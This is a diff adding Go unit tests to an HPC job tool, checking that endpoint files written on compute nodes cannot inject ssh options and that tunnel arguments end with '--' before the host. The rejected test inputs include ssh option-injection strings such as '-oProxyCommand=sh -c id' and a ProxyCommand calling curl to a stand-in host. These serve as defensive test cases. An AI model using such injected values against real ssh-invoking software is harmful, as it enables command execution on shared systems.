@@ -1092,3 +1092,53 @@ func TestApptainerScriptResolvesTheRuntimeOnTheComputeNode(t *testing.T) {
 		t.Errorf("container resolver emitted for a non-container tool:\n%s", plain)
 	}
 }
+
+// An endpoint is written on a compute node and read on the login node; a job
+// must not be able to turn it into an ssh option. The host is what lands in the
+// ssh destination argument, so "-oProxyCommand=..." must be rejected.
+func TestReadEndpointRejectsAnSshOptionAsHost(t *testing.T) {
+	dir := t.TempDir()
+	for _, raw := range []string{
+		"-oProxyCommand=sh -c id;x:4000",
+		"-oProxyCommand=curl evil.example:80",
+		"bad host:4000",
+		"host@other:4000",
+	} {
+		if err := os.WriteFile(filepath.Join(dir, FileEndpoint), []byte(raw+"\n"), 0o644); err != nil {
+			t.Fatal(err)
+		}
+		if _, err := ReadEndpoint(dir); err == nil {
+			t.Errorf("ReadEndpoint accepted %q", raw)
+		}
+	}
+}
+
+func TestReadEndpointAcceptsNodeNameAndIP(t *testing.T) {
+	dir := t.TempDir()
+	for _, raw := range []string{
+		"node042.cluster.local:4000",
+		"10.20.30.40:4000",
+		"127.0.0.1:4000",
+		"[::1]:4000",
+	} {
+		if err := os.WriteFile(filepath.Join(dir, FileEndpoint), []byte(raw+"\n"), 0o644); err != nil {
+			t.Fatal(err)
+		}
+		target, err := ReadEndpoint(dir)
+		if err != nil {
+			t.Errorf("ReadEndpoint(%q): %v", raw, err)
+			continue
+		}
+		if target.Port != 4000 {
+			t.Errorf("ReadEndpoint(%q) port = %d", raw, target.Port)
+		}
+	}
+}
+
+func TestTunnelArgsTerminateOptionsBeforeDestination(t *testing.T) {
+	tun := &Tunnel{LocalPort: 20001, Node: "node042", RemoteHost: "127.0.0.1", RemotePort: 4000}
+	args := tun.Args()
+	if len(args) < 2 || args[len(args)-2] != "--" || args[len(args)-1] != "node042" {
+		t.Fatalf("ssh args must end with -- destination, got %v", args)
+	}
+}
